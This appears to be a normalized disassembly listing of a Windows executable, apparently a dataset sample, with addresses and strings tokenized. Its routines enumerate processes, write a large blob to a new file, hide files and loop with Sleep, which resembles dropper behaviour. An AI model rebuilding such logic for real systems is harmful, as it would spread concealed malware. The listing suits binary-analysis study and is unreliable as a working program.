+lea eax [ ebp - 0x1e0 ]
+push eax
+lea eax [ ebp - 0x64 ]
+push eax
+push rw-data
+push edi
+call esi
+mov eax [ ebp - 0x78 ]
+cmp eax ebx
+jne r-xdata
+push rw-data
+push rw-data
+jmp r-xdata
+push rw-data
+push rw-data
+push rw-data
+push rw-data
+mov edi rw-data
+push rw-data
+push edi
+call esi
+lea eax [ ebp - 0x1e0 ]
+push eax
+lea eax [ ebp - 0xbc ]
+push eax
+push rw-data
+push edi
+call esi
+push 0x4
+lea eax [ ebp - 0x18 ]
+push ebx
+push eax
+call memset
+add esp 0xc
+lea eax [ ebp - 0x18 ]
+push [ ebp - 0x28 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+add esp 0xc
+lea eax [ ebp - 0x1e0 ]
+push eax
+lea eax [ ebp - 0x18 ]
+push eax
+push rw-data
+push edi
+call esi
+lea eax [ ebp - 0x1e0 ]
+push eax
+lea eax [ ebp - 0xcc ]
+push eax
+push rw-data
+push edi
+call esi
+lea eax [ ebp - 0x1e0 ]
+push eax
+lea eax [ ebp - 0xdc ]
+push eax
+push rw-data
+push edi
+call esi
+push 0x4
+lea eax [ ebp - 0x18 ]
+push ebx
+push eax
+call memset
+add esp 0xc
+lea eax [ ebp - 0x18 ]
+push [ ebp - 0x30 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+add esp 0xc
+lea eax [ ebp - 0x1e0 ]
+push eax
+lea eax [ ebp - 0x18 ]
+push eax
+push rw-data
+push edi
+jmp r-xdata
+push rw-data
+push edi
+call esi
+cmp [ ebp - 0x20 ] ebx
+lea eax [ ebp - 0x1e0 ]
+push eax
+je r-xdata
+push rw-data
+push rw-data
+jmp r-xdata
+call esi
+cmp [ ebp - 0x68 ] ebx
+lea eax [ ebp - 0x1e0 ]
+push eax
+je r-xdata
+push 0x1
+lea ecx [ ebp - 0x7c ]
+mov [ ebp - 0x4 ] 0x1
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+push 0x1
+lea ecx [ ebp - 0x8c ]
+mov [ ebp - 0x4 ] bl
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+or [ ebp - 0x4 ] 0xffffffff
+push 0x1
+lea ecx [ ebp - 0x9c ]
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+mov ecx [ ebp - 0xc ]
+mov eax esi
+pop edi
+pop esi
+pop ebx
+mov [ fs : 0x0 ] ecx
+leave
+retn
+push rw-data
+push rw-data
+call esi
+push 0x1
+pop esi
+jmp r-xdata
+sub_4021b5
+push ebp
+mov ebp esp
+sub esp 0x20c
+push esi
+push edi
+mov esi 0x104
+xor edi edi
+push esi
+lea eax [ ebp - 0x20c ]
+push edi
+push eax
+mov [ ebp - 0x4 ] edi
+call memset
+push esi
+lea eax [ ebp - 0x108 ]
+push edi
+push eax
+call memset
+add esp 0x18
+lea eax [ ebp - 0x4 ]
+mov [ ebp - 0x4 ] edi
+push eax
+push 0x5
+push edi
+call [ SHGetSpecialFolderLocation@IAT ]
+cmp [ ebp - 0x4 ] edi
+je r-xdata
+lea eax [ ebp - 0x108 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+pop ecx
+pop ecx
+lea eax [ ebp - 0x108 ]
+push eax
+push [ ebp - 0x4 ]
+call [ SHGetPathFromIDListA@IAT ]
+test eax eax
+je r-xdata
+lea eax [ ebp - 0x20c ]
+push esi
+push eax
+lea eax [ ebp - 0x108 ]
+push eax
+call [ GetShortPathNameA@IAT ]
+jmp r-xdata
+mov esi [ ebp + 0x8 ]
+mov al [ ebp + 0xb ]
+push edi
+mov ecx esi
+mov [ esi ] al
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+lea eax [ ebp - 0x108 ]
+push eax
+call strlen
+pop ecx
+push eax
+lea eax [ ebp - 0x108 ]
+push eax
+mov ecx esi
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+mov eax esi
+pop edi
+pop esi
+leave
+retn
+sub_402271
+push ebp
+mov ebp esp
+sub esp 0x20c
+push esi
+push edi
+mov esi 0x104
+xor edi edi
+push esi
+lea eax [ ebp - 0x20c ]
+push edi
+push eax
+mov [ ebp - 0x4 ] edi
+call memset
+push esi
+lea eax [ ebp - 0x108 ]
+push edi
+push eax
+call memset
+add esp 0x18
+lea eax [ ebp - 0x4 ]
+mov [ ebp - 0x4 ] edi
+push eax
+push 0x8
+push edi
+call [ SHGetSpecialFolderLocation@IAT ]
+cmp [ ebp - 0x4 ] edi
+je r-xdata
+lea eax [ ebp - 0x108 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+pop ecx
+pop ecx
+lea eax [ ebp - 0x108 ]
+push eax
+push [ ebp - 0x4 ]
+call [ SHGetPathFromIDListA@IAT ]
+test eax eax
+je r-xdata
+lea eax [ ebp - 0x20c ]
+push esi
+push eax
+lea eax [ ebp - 0x108 ]
+push eax
+call [ GetShortPathNameA@IAT ]
+jmp r-xdata
+mov esi [ ebp + 0x8 ]
+mov al [ ebp + 0xb ]
+push edi
+mov ecx esi
+mov [ esi ] al
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+lea eax [ ebp - 0x108 ]
+push eax
+call strlen
+pop ecx
+push eax
+lea eax [ ebp - 0x108 ]
+push eax
+mov ecx esi
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+mov eax esi
+pop edi
+pop esi
+leave
+retn
+sub_40232d
+push ebp
+mov ebp esp
+sub esp 0x128
+and [ ebp - 0x128 ] 0x0
+push esi
+push edi
+push 0x49
+pop ecx
+xor eax eax
+lea edi [ ebp - 0x124 ]
+push eax
+[ edi ]
+push 0x2
+call CreateToolhelp32Snapshot
+mov esi eax
+test esi esi
+je r-xdata
+push rw-data
+call [ LoadLibraryA@IAT ]
+push rw-data
+push eax
+call [ GetProcAddress@IAT ]
+push esi
+call eax
+xor eax eax
+lea eax [ ebp - 0x128 ]
+mov [ ebp - 0x128 ] 0x128
+push eax
+push esi
+call Process32First
+push [ ebp + 0x8 ]
+lea eax [ ebp - 0x104 ]
+push eax
+call [ _stricmp@IAT ]
+pop ecx
+test eax eax
+pop ecx
+jne r-xdata
+lea eax [ ebp - 0x128 ]
+push eax
+push esi
+call Process32Next
+jmp r-xdata
+mov eax [ ebp - 0x120 ]
+cmp eax [ rw-data ]
+je r-xdata
+test eax eax
+je r-xdata
+push 0x1
+pop eax
+jmp r-xdata
+pop edi
+pop esi
+leave
+retn
+sub_4023cd
+sub esp 0x144
+push ebx
+mov ebx [ Sleep@IAT ]
+push ebp
+push esi
+mov esi [ std::operator<<@IAT ]
+push edi
+xor ebp ebp
+mov edi rw-data
+push rw-data
+push [ std::cout@IAT ]
+call esi
+push eax
+call [ std::endl@IAT ]
+add esp 0xc
+push ebp
+push 0x80
+push 0x2
+push ebp
+push ebp
+push 0x40000000
+push rw-data
+call [ CreateFileA@IAT ]
+mov edi eax
+cmp edi 0xffffffff
+je r-xdata
+push 0xea60
+push edi
+push rw-data
+call sub_401732
+mov eax [ rw-data ]
+pop ecx
+cmp eax ebp
+pop ecx
+jne r-xdata
+push rw-data
+push [ std::cout@IAT ]
+call esi
+push eax
+call [ std::endl@IAT ]
+add esp 0xc
+lea eax [ esp + 0x10 ]
+mov [ esp + 0x10 ] ebp
+push ebp
+push eax
+push 0x1f600
+push rw-data
+push edi
+call [ WriteFile@IAT ]
+push edi
+call [ CloseHandle@IAT ]
+push rw-data
+push [ std::cout@IAT ]
+call esi
+push eax
+call [ std::endl@IAT ]
+add esp 0xc
+call sub_4019b3
+test eax eax
+jne r-xdata
+push rw-data
+call sub_40232d
+test eax eax
+pop ecx
+jne r-xdata
+push 0x2
+push eax
+call [ SetFileAttributesA@IAT ]
+mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
+push rw-data
+call sub_40184b
+test eax eax
+pop ecx
+jne r-xdata
+push rw-data
+mov edi rw-data
+push edi
+push rw-data
+call sub_401732
+pop ecx
+pop ecx
+push 0xc8
+call ebx
+mov eax [ rw-data ]
+cmp eax ebp
+jne r-xdata
+push rw-data
+jmp r-xdata
+call ebx
+jmp r-xdata
+push 0x2
+push eax
+call [ SetFileAttributesA@IAT ]
+jmp r-xdata
+mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
+push [ std::cout@IAT ]
+call esi
+push eax
+call [ std::endl@IAT ]
+add esp 0xc
+push 0x2710
+jmp r-xdata
+lea eax [ esp + 0x14 ]
+push eax
+push edi
+call [ FindFirstFileA@IAT ]
+cmp eax 0xffffffff
+jne r-xdata
+sub_40253c
+push ebp
+mov ebp esp
+sub esp 0x244
+push esi
+push edi
+lea eax [ ebp - 0x244 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+pop ecx
+lea eax [ ebp - 0x140 ]
+pop ecx
+push eax
+lea eax [ ebp - 0x244 ]
+push eax
+call [ FindFirstFileA@IAT ]
+mov edi eax
+cmp edi 0xffffffff
+je r-xdata
+xor eax eax
+mov esi [ _stricmp@IAT ]
+lea eax [ ebp - 0x140 ]
+push eax
+push edi
+call [ FindNextFileA@IAT ]
+test eax eax
+je r-xdata
+lea eax [ ebp - 0x114 ]
+push rw-data
+push eax
+call esi
+pop ecx
+test eax eax
+pop ecx
+je r-xdata
+push edi
+call [ FindClose@IAT ]
+jmp r-xdata
+test [ ebp - 0x140 ] 0x10
+je r-xdata
+lea eax [ ebp - 0x114 ]
+push rw-data
+push eax
+call esi
+pop ecx
+test eax eax
+pop ecx
+je r-xdata
+lea eax [ ebp - 0x114 ]
+push rw-data
+push eax
+call strcmp
+pop ecx
+test eax eax
+pop ecx
+je r-xdata
+push 0x1
+pop eax
+jmp r-xdata
+pop edi
+pop esi
+leave
+retn
+_start
+push ebp
+mov ebp esp
+push 0xffffffff
+push r--data
+push _except_handler3
+mov eax [ fs : 0x0 ]
+push eax
+mov [ fs : 0x0 ] esp
+sub esp 0x68
+push ebx
+push esi
+push edi
+mov [ ebp - 0x18 ] esp
+xor ebx ebx
+mov [ ebp - 0x4 ] ebx
+push 0x2
+call [ __set_app_type@IAT ]
+pop ecx
+or [ rw-data ] 0xffffffff
+or [ rw-data ] 0xffffffff
+call [ __p__fmode@IAT ]
+mov ecx [ rw-data ]
+mov [ eax ] ecx
+call [ __p__commode@IAT ]
+mov ecx [ rw-data ]
+mov [ eax ] ecx
+mov eax [ _adjust_fdiv@IAT ]
+mov eax [ eax ]
+mov [ rw-data ] eax
+call sub_40280d
+cmp [ rw-data ] ebx
+jne r-xdata
+call sub_4027f8
+push rw-data
+push rw-data
+call _initterm
+mov eax [ rw-data ]
+mov [ ebp - 0x6c ] eax
+lea eax [ ebp - 0x6c ]
+push eax
+push [ rw-data ]
+lea eax [ ebp - 0x64 ]
+push eax
+lea eax [ ebp - 0x70 ]
+push eax
+lea eax [ ebp - 0x60 ]
+push eax
+call [ __getmainargs@IAT ]
+push rw-data
+push rw-data
+call _initterm
+add esp 0x24
+mov eax [ _acmdln@IAT ]
+mov esi [ eax ]
+mov [ ebp - 0x74 ] esi
+cmp [ esi ] 0x22
+jne r-xdata
+push sub_40280a
+call [ __setusermatherr@IAT ]
+pop ecx
+cmp [ esi ] 0x20
+jbe r-xdata
+inc esi
+mov [ ebp - 0x74 ] esi
+mov al [ esi ]
+cmp al bl
+je r-xdata
+mov al [ esi ]
+cmp al bl
+je r-xdata
+inc esi
+mov [ ebp - 0x74 ] esi
+jmp r-xdata
+cmp [ esi ] 0x22
+jne r-xdata
+cmp al 0x22
+jne r-xdata
+mov [ ebp - 0x30 ] ebx
+lea eax [ ebp - 0x5c ]
+push eax
+call [ GetStartupInfoA@IAT ]
+test [ ebp - 0x30 ] 0x1
+je r-xdata
+cmp al 0x20
+jbe r-xdata
+inc esi
+mov [ ebp - 0x74 ] esi
+push 0xa
+pop eax
+movzx eax [ ebp - 0x2c ]
+jmp r-xdata
+push eax
+push esi
+push ebx
+push ebx
+call [ GetModuleHandleA@IAT ]
+push eax
+call sub_401250
+mov [ ebp - 0x68 ] eax
+push eax
+call [ exit@IAT ]
+sub_40119f
+call ??0Init@ios_base@std@@QAE@XZ
+jmp sub_4011b4
+??0Init@ios_base@std@@QAE@XZ
+mov ecx rw-data
+jmp [ std::ios_base::Init::Init@IAT ]
+sub_4011b4
+push ??1Init@ios_base@std@@QAE@XZ
+call sub_402648
+pop ecx
+retn
+??1Init@ios_base@std@@QAE@XZ
+mov ecx rw-data
+jmp [ std::ios_base::Init::~Init@IAT ]
+sub_4011cb
+call ??0_Winit@std@@QAE@XZ
+jmp sub_4011e0
+??0_Winit@std@@QAE@XZ
+mov ecx rw-data
+jmp [ std::_Winit::_Winit@IAT ]
+sub_4011e0
+push ??1_Winit@std@@QAE@XZ
+call sub_402648
+pop ecx
+retn
+??1_Winit@std@@QAE@XZ
+mov ecx rw-data
+jmp [ std::_Winit::~_Winit@IAT ]
+sub_4011f7
+call sub_401201
+jmp sub_401236
+sub_401236
+push sub_401242
+call sub_402648
+pop ecx
+retn
+sub_401242
+push 0x1
+mov ecx rw-data
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+retn
+CreateToolhelp32Snapshot
+jmp [ CreateToolhelp32Snapshot@IAT ]
+Process32Next
+jmp [ Process32Next@IAT ]
+Process32First
+jmp [ Process32First@IAT ]
+strlen
+jmp [ strlen@IAT ]
+_except_handler3
+jmp [ _except_handler3@IAT ]
+strcmp
+jmp [ strcmp@IAT ]
+sub_40261c
+cmp [ rw-data ] 0xffffffff
+jne r-xdata
+push rw-data
+push rw-data
+push [ esp + 0xc ]
+call __dllonexit
+add esp 0xc
+retn
+push [ esp + 0x4 ]
+call [ _onexit@IAT ]
+pop ecx
+retn
+sub_402648
+push [ esp + 0x4 ]
+call sub_40261c
+neg eax
+sbb eax eax
+pop ecx
+neg eax
+dec eax
+retn
+memset
+jmp [ memset@IAT ]
+__CxxFrameHandler
+jmp [ __CxxFrameHandler@IAT ]
+sub_402668
+push 0xffffffff
+push eax
+mov eax [ fs : 0x0 ]
+push eax
+mov eax [ esp + 0xc ]
+mov [ fs : 0x0 ] esp
+mov [ esp + 0xc ] ebp
+lea ebp [ esp + 0xc ]
+push eax
+retn
+sub_4027d9
+mov esp [ ebp - 0x18 ]
+push [ ebp - 0x78 ]
+call [ _exit@IAT ]
+int3
+__dllonexit
+jmp [ __dllonexit@IAT ]
+_XcptFilter
+jmp [ _XcptFilter@IAT ]
+_initterm
+jmp [ _initterm@IAT ]
+sub_4027f8
+push 0x30000
+push 0x10000
+call _controlfp
+pop ecx
+pop ecx
+retn
+sub_40280a
+xor eax eax
+retn
+sub_40280d
+retn
+_controlfp
+jmp [ _controlfp@IAT ]
+??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
+jmp [ std::operator<<@IAT ]
+??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
+jmp [ std::operator&@IAT ]
+sub_40282c
+lea ecx [ ebp - 0x9c ]
+jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
+sub_402838
+lea ecx [ ebp - 0x8c ]
+jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
+sub_402844
+lea ecx [ ebp - 0x7c ]
+jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
+sub_40284d
+lea ecx [ ebp - 0xac ]
+jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
+sub_402859
+lea ecx [ ebp - 0xac ]
+jmp [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
+sub_402865
+mov eax r--data
+jmp __CxxFrameHandler
